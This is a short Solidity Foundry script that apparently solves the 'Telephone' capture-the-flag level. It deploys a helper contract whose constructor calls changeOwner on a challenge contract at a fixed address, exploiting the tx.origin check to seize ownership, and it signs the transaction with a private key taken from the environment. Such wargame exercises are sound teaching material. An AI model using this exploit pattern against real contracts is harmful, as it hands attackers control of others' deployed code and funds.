//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneAttack {
  constructor(Telephone _telePhoneInstace) {
    _telePhoneInstace.changeOwner(0xcFc07EDEF2649DCBBb0ccF99DbB46A3d66bD80D0);
    console.log("Owner: ", _telePhoneInstace.owner());
  }
}

contract TelephoneSolution is Script {

  Telephone telePhoneInstance = Telephone(0x17e06688E0EE91fA444B53c46F07e7926Ed2A1aF);
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    new TelephoneAttack(telePhoneInstance);
    
    vm.stopBroadcast();
  }
}